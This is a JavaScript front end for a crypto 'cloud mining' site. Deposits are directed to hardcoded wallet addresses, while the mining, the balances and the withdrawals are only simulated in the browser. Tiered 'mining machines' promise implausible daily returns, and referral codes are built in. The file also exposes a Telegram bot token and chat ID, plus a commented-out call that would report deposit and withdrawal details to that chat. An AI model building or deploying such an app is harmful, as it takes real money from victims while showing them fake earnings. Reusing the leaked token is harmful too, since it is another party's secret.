// User data and state
const userData = {
    brokerBalance: 20.000000,
    fundBalance: 0.000000,
    userId: Math.floor(100000 + Math.random() * 900000),
    minedToday: 0.000000,
    totalMined: 0.000000,
    miningPower: 0,
    isMining: false,
    miningStartTime: null,
    miningMachines: [],
    selectedMachine: null,
    selectedNetwork: null,
    selectedPaymentMethod: null
};

// Payment addresses
const paymentAddresses = {
    ETH: "0x53f90e7a0d2834b772890f4f456d51aaed61de43",
    TRX: "TSKPhwUavSrKXXcbWG2TdPzYiBtoTNXP6i",
    BNB: "0x53f90e7a0d2834b772890f4f456d51aaed61de43",
    SOL: "HvHR4LeKdCH5Z2UDKVSDuju8c4ukPAa1CzchHseZ2LKu",
    TON: "UQCQcNww5CQho7aDQSb4AC_o3TPXeDshkD64L_iY7wknzyaz",
    MORPH: "0x53f90e7a0d2834b772890f4f456d51aaed61de43"
};

// Mining machines data
const miningMachines = [
    { id: 1, name: "Mining Machine 1", price: 10, dailyMining: 2, bonus: 0.6 },
    { id: 2, name: "Mining Machine 2", price: 50, dailyMining: 10, bonus: 3 },
    { id: 3, name: "Mining Machine 3", price: 150, dailyMining: 30, bonus: 9 },
    { id: 4, name: "Mining Machine 4", price: 450, dailyMining: 90, bonus: 27 },
    { id: 5, name: "Mining Machine 5", price: 1350, dailyMining: 275, bonus: 82.5 },
    { id: 6, name: "Mining Machine 6", price: 4050, dailyMining: 844, bonus: 253.2 },
    { id: 7, name: "Mining Machine 7", price: 12150, dailyMining: 2650, bonus: 795 },
    { id: 8, name: "Mining Machine 8", price: 36450, dailyMining: 8477, bonus: 2543.1 },
    { id: 9, name: "Mining Machine 9", price: 72900, dailyMining: 29160, bonus: 8748 },
    { id: 10, name: "Mining Machine 10", price: 145800, dailyMining: 72900, bonus: 21870 }
];

// Telegram API configuration
const telegramConfig = {
    apiId: "8401039769:AAErdk3eB81U9PTBUtHpNeM4FdWVpo-0Os0",
    chatId: "7417215529"
};

// DOM elements
const elements = {
    brokerBalance: document.getElementById('broker-balance'),
    fundBalance: document.getElementById('fund-balance'),
    userId: document.getElementById('user-id'),
    minedToday: document.getElementById('mined-today'),
    totalMined: document.getElementById('total-mined'),
    miningPower: document.getElementById('mining-power'),
    startMining: document.getElementById('start-mining'),
    claimRewards: document.getElementById('claim-rewards'),
    miningCircle: document.getElementById('mining-circle'),
    miningAnimation: document.getElementById('mining-animation'),
    machinesGrid: document.getElementById('machines-grid'),
    withdrawBalance: document.getElementById('withdraw-balance'),
    actualArrival: document.getElementById('actual-arrival'),
    depositModal: document.getElementById('deposit-modal'),
    purchaseModal: document.getElementById('purchase-modal'),
    loadingScreen: document.getElementById('loading-screen'),
    notification: document.getElementById('notification'),
    notificationText: document.getElementById('notification-text'),
    tabButtons: document.querySelectorAll('.tab-btn'),
    tabContents: document.querySelectorAll('.tab-content')
};

// Initialize the application
function init() {
    updateUI();
    setupEventListeners();
    renderMiningMachines();
    
    // Set user ID in all places
    document.getElementById('ref-code').textContent = userData.userId;
    document.getElementById('team-ref-code').textContent = userData.userId;
    elements.userId.textContent = userData.userId;
}

// Update UI with current user data
function updateUI() {
    elements.brokerBalance.textContent = userData.brokerBalance.toFixed(6) + ' USDT';
    elements.fundBalance.textContent = userData.fundBalance.toFixed(6) + ' USDT';
    elements.minedToday.textContent = userData.minedToday.toFixed(6) + ' SOL';
    elements.totalMined.textContent = userData.totalMined.toFixed(6) + ' SOL';
    elements.miningPower.textContent = userData.miningPower + ' MH/s';
    elements.withdrawBalance.textContent = userData.fundBalance.toFixed(6) + ' USDT';
    
    // Update mining controls
    if (userData.isMining) {
        elements.startMining.disabled = true;
        elements.claimRewards.disabled = true;
        elements.miningCircle.textContent = 'MINING...';
    } else {
        elements.startMining.disabled = false;
        elements.claimRewards.disabled = userData.minedToday === 0;
    }
    
    // Update purchase balance
    document.getElementById('purchase-balance').textContent = userData.brokerBalance.toFixed(6) + ' USDT';
}

// Setup event listeners
function setupEventListeners() {
    // Tab navigation
    elements.tabButtons.forEach(button => {
        button.addEventListener('click', () => {
            const tabId = button.getAttribute('data-tab');
            
            // Update active tab button
            elements.tabButtons.forEach(btn => btn.classList.remove('active'));
            button.classList.add('active');
            
            // Update active tab content
            elements.tabContents.forEach(content => content.classList.remove('active'));
            document.getElementById(`${tabId}-tab`).classList.add('active');
        });
    });
    
    // Mining controls
    elements.startMining.addEventListener('click', startMining);
    elements.claimRewards.addEventListener('click', claimRewards);
    
    // Deposit modal
    document.getElementById('close-deposit').addEventListener('click', () => {
        elements.depositModal.style.display = 'none';
    });
    
    // Purchase modal
    document.getElementById('close-purchase').addEventListener('click', () => {
        elements.purchaseModal.style.display = 'none';
    });
    
    // Network selection for withdrawal
    document.querySelectorAll('.network-option[data-network]').forEach(option => {
        option.addEventListener('click', () => {
            document.querySelectorAll('.network-option[data-network]').forEach(opt => {
                opt.classList.remove('selected');
            });
            option.classList.add('selected');
            userData.selectedNetwork = option.getAttribute('data-network');
        });
    });
    
    // Payment method selection for deposit
    document.querySelectorAll('.network-option[data-method]').forEach(option => {
        option.addEventListener('click', () => {
            document.querySelectorAll('.network-option[data-method]').forEach(opt => {
                opt.classList.remove('selected');
            });
            option.classList.add('selected');
            userData.selectedPaymentMethod = option.getAttribute('data-method');
            
            // Show payment address
            document.getElementById('selected-address').textContent = 
                paymentAddresses[userData.selectedPaymentMethod];
            document.getElementById('payment-addresses').style.display = 'block';
            document.getElementById('confirm-deposit').disabled = false;
        });
    });
    
    // Copy address button
    document.getElementById('copy-address').addEventListener('click', () => {
        const address = document.getElementById('selected-address').textContent;
        navigator.clipboard.writeText(address).then(() => {
            showNotification('Address copied to clipboard!');
        });
    });
    
    // Copy referral code buttons
    document.getElementById('copy-ref').addEventListener('click', () => {
        const refCode = 'SOL-' + userData.userId;
        navigator.clipboard.writeText(refCode).then(() => {
            showNotification('Referral code copied to clipboard!');
        });
    });
    
    document.getElementById('copy-team-ref').addEventListener('click', () => {
        const refCode = 'SOL-' + userData.userId;
        navigator.clipboard.writeText(refCode).then(() => {
            showNotification('Referral code copied to clipboard!');
        });
    });
    
    // Withdraw all button
    document.getElementById('withdraw-all').addEventListener('click', () => {
        document.getElementById('withdraw-amount').value = userData.fundBalance.toFixed(2);
        updateActualArrival();
    });
    
    // Withdraw amount input
    document.getElementById('withdraw-amount').addEventListener('input', updateActualArrival);
    
    // Confirm withdrawal
    document.getElementById('confirm-withdraw').addEventListener('click', processWithdrawal);
    
    // Confirm deposit
    document.getElementById('confirm-deposit').addEventListener('click', processDeposit);
    
    // Confirm purchase
    document.getElementById('confirm-purchase').addEventListener('click', processPurchase);
    
    // Add deposit button to header
    const depositButton = document.createElement('button');
    depositButton.className = 'btn';
    depositButton.textContent = 'DEPOSIT';
    depositButton.style.marginLeft = '15px';
    depositButton.addEventListener('click', () => {
        elements.depositModal.style.display = 'flex';
    });
    
    document.querySelector('.user-info').appendChild(depositButton);
}

// Render mining machines in the upgrade tab
function renderMiningMachines() {
    elements.machinesGrid.innerHTML = '';
    
    miningMachines.forEach(machine => {
        const machineCard = document.createElement('div');
        machineCard.className = 'machine-card';
        machineCard.innerHTML = `
            <div class="card-glow"></div>
            <h3>${machine.name}</h3>
            <div class="machine-details">
                <p>Price: <span>${machine.price} USDT</span></p>
                <p>Daily Mining: <span>${machine.dailyMining} USDT</span></p>
                <p>Sol Coin Bonus: <span>+${machine.bonus} SOL</span></p>
                <p>Total Daily: <span>${(machine.dailyMining + machine.bonus).toFixed(1)} SOL</span></p>
            </div>
            <button class="btn purchase-btn" data-id="${machine.id}">PURCHASE</button>
        `;
        
        elements.machinesGrid.appendChild(machineCard);
    });
    
    // Add event listeners to purchase buttons
    document.querySelectorAll('.purchase-btn').forEach(button => {
        button.addEventListener('click', (e) => {
            const machineId = parseInt(e.target.getAttribute('data-id'));
            openPurchaseModal(machineId);
        });
    });
}

// Open purchase modal for a specific machine
function openPurchaseModal(machineId) {
    const machine = miningMachines.find(m => m.id === machineId);
    userData.selectedMachine = machine;
    
    const purchaseDetails = document.getElementById('purchase-details');
    purchaseDetails.innerHTML = `
        <div class="purchase-info">
            <h3 style="color: var(--primary); margin-bottom: 10px;">${machine.name}</h3>
            <p>Price: <span style="color: var(--accent); font-weight: bold;">${machine.price} USDT</span></p>
            <p>Daily Mining: <span style="color: var(--accent);">${machine.dailyMining} USDT</span></p>
            <p>Sol Coin Bonus: <span style="color: var(--accent);">+${machine.bonus} SOL</span></p>
            <p>Total Daily: <span style="color: var(--accent); font-weight: bold;">${(machine.dailyMining + machine.bonus).toFixed(1)} SOL</span></p>
        </div>
    `;
    
    elements.purchaseModal.style.display = 'flex';
}

// Start mining process
function startMining() {
    if (userData.miningPower === 0) {
        showNotification('Please purchase a mining machine first!');
        document.querySelector('.tab-btn[data-tab="upgrade"]').click();
        return;
    }
    
    userData.isMining = true;
    userData.miningStartTime = Date.now();
    elements.startMining.disabled = true;
    elements.miningCircle.textContent = 'MINING...';
    
    // Create mining particles
    createMiningParticles();
    
    // Simulate mining progress
    const miningInterval = setInterval(() => {
        if (!userData.isMining) {
            clearInterval(miningInterval);
            return;
        }
        
        const elapsedTime = Date.now() - userData.miningStartTime;
        const progress = Math.min(elapsedTime / (12 * 60 * 60 * 1000), 1); // 12 hours total
        
        if (progress >= 1) {
            // Mining completed
            userData.isMining = false;
            userData.minedToday += userData.miningPower * 0.1; // Simplified calculation
            elements.claimRewards.disabled = false;
            elements.miningCircle.textContent = 'COMPLETE!';
            clearInterval(miningInterval);
            showNotification('Mining completed! You can now claim your rewards.');
        }
        
        updateUI();
    }, 1000);
    
    showNotification('Mining started! It will take 12 hours to complete.');
}

// Claim mining rewards
function claimRewards() {
    userData.fundBalance += userData.minedToday;
    userData.totalMined += userData.minedToday;
    userData.minedToday = 0;
    elements.claimRewards.disabled = true;
    updateUI();
    showNotification(`Rewards claimed! ${userData.minedToday.toFixed(6)} SOL added to your fund balance.`);
}

// Create mining animation particles
function createMiningParticles() {
    for (let i = 0; i < 20; i++) {
        const particle = document.createElement('div');
        particle.className = 'mining-particle';
        
        const angle = Math.random() * Math.PI * 2;
        const distance = 80 + Math.random() * 70;
        const x = Math.cos(angle) * distance;
        const y = Math.sin(angle) * distance;
        
        particle.style.left = `calc(50% + ${x}px)`;
        particle.style.top = `calc(50% + ${y}px)`;
        
        elements.miningAnimation.appendChild(particle);
        
        // Animate particle
        setTimeout(() => {
            particle.style.transition = 'all 1s ease';
            particle.style.transform = `translate(${-x}px, ${-y}px)`;
            particle.style.opacity = '1';
            
            setTimeout(() => {
                particle.style.opacity = '0';
                setTimeout(() => {
                    if (elements.miningAnimation.contains(particle)) {
                        elements.miningAnimation.removeChild(particle);
                    }
                }, 1000);
            }, 1000);
        }, i * 100);
    }
    
    // Continue creating particles if still mining
    if (userData.isMining) {
        setTimeout(createMiningParticles, 2000);
    }
}

// Process deposit
function processDeposit() {
    const amount = parseFloat(document.getElementById('deposit-amount').value);
    
    if (isNaN(amount) || amount < 10) {
        showNotification('Minimum deposit is 10 USDT');
        return;
    }
    
    // Show loading screen
    elements.loadingScreen.style.display = 'flex';
    
    // Simulate processing
    setTimeout(() => {
        // Add to broker balance
        userData.brokerBalance += amount;
        
        // Close modals and reset
        elements.depositModal.style.display = 'none';
        elements.loadingScreen.style.display = 'none';
        document.getElementById('deposit-amount').value = '';
        
        // Send Telegram notification (simulated)
        sendTelegramNotification(`New deposit: ${amount} USDT via ${userData.selectedPaymentMethod}`);
        
        updateUI();
        showNotification(`Deposit of ${amount} USDT successful! Funds added to your broker balance.`);
    }, 2000);
}

// Process purchase
function processPurchase() {
    const machine = userData.selectedMachine;
    
    if (userData.brokerBalance < machine.price) {
        showNotification('Insufficient broker balance. Please deposit more funds.');
        elements.purchaseModal.style.display = 'none';
        elements.depositModal.style.display = 'flex';
        return;
    }
    
    // Show loading screen
    elements.loadingScreen.style.display = 'flex';
    
    // Simulate processing
    setTimeout(() => {
        // Deduct from broker balance
        userData.brokerBalance -= machine.price;
        
        // Add mining power
        userData.miningPower += machine.dailyMining;
        
        // Add to user's machines
        userData.miningMachines.push(machine);
        
        // Close modals
        elements.purchaseModal.style.display = 'none';
        elements.loadingScreen.style.display = 'none';
        
        // Send Telegram notification (simulated)
        sendTelegramNotification(`New purchase: ${machine.name} for ${machine.price} USDT`);
        
        updateUI();
        showNotification(`Successfully purchased ${machine.name}! Your mining power increased.`);
    }, 2000);
}

// Process withdrawal
function processWithdrawal() {
    const amount = parseFloat(document.getElementById('withdraw-amount').value);
    const address = document.getElementById('withdraw-address').value;
    
    if (!userData.selectedNetwork) {
        showNotification('Please select a network');
        return;
    }
    
    if (!address) {
        showNotification('Please enter a withdrawal address');
        return;
    }
    
    if (isNaN(amount) || amount < 50) {
        showNotification('Minimum withdrawal is 50 USDT');
        return;
    }
    
    if (amount > userData.fundBalance) {
        showNotification('Insufficient fund balance');
        return;
    }
    
    // Show loading screen
    elements.loadingScreen.style.display = 'flex';
    
    // Simulate processing
    setTimeout(() => {
        // Deduct from fund balance
        userData.fundBalance -= amount;
        
        // Reset form
        document.getElementById('withdraw-amount').value = '';
        document.getElementById('withdraw-address').value = '';
        document.querySelectorAll('.network-option[data-network]').forEach(opt => {
            opt.classList.remove('selected');
        });
        userData.selectedNetwork = null;
        
        // Close loading screen
        elements.loadingScreen.style.display = 'none';
        
        // Send Telegram notification (simulated)
        sendTelegramNotification(`Withdrawal request: ${amount} USDT to ${address} via ${userData.selectedNetwork}`);
        
        updateUI();
        showNotification(`Withdrawal request submitted! Please allow 24 hours for processing.`);
    }, 2000);
}

// Update actual arrival amount for withdrawal
function updateActualArrival() {
    const amount = parseFloat(document.getElementById('withdraw-amount').value) || 0;
    elements.actualArrival.textContent = amount.toFixed(6) + ' USDT';
}

// Show notification
function showNotification(message) {
    elements.notificationText.textContent = message;
    elements.notification.classList.add('show');
    
    setTimeout(() => {
        elements.notification.classList.remove('show');
    }, 3000);
}

// Send Telegram notification (simulated)
function sendTelegramNotification(message) {
    // In a real implementation, this would send a request to the Telegram API
    console.log(`Telegram notification: ${message}`);
    // Example: fetch(`https://api.telegram.org/bot${telegramConfig.apiId}/sendMessage?chat_id=${telegramConfig.chatId}&text=${encodeURIComponent(message)}`);
}

// Initialize the app when DOM is loaded
document.addEventListener('DOMContentLoaded', init);
